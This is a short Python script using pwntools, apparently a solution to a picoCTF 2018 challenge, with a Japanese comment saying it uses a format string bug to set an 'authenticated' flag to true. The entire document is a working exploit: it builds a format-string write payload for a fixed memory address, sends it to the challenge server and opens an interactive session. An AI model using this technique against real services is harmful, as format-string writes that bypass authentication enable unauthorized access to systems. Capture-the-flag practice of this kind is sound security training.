from pwn import *

# fsbを使ってauthenticatedをTrueに書き換える

authenticated_address = 0x0804a04c
rewrite_value = 0x12345678

payload = fmtstr_payload(11, {authenticated_address: rewrite_value}, numbwritten=0, write_size='short')

host = '2018shell3.picoctf.com'
port = 52398

p = remote(host, port)
p.recv(1048)
p.sendline(payload)

p.interactive()
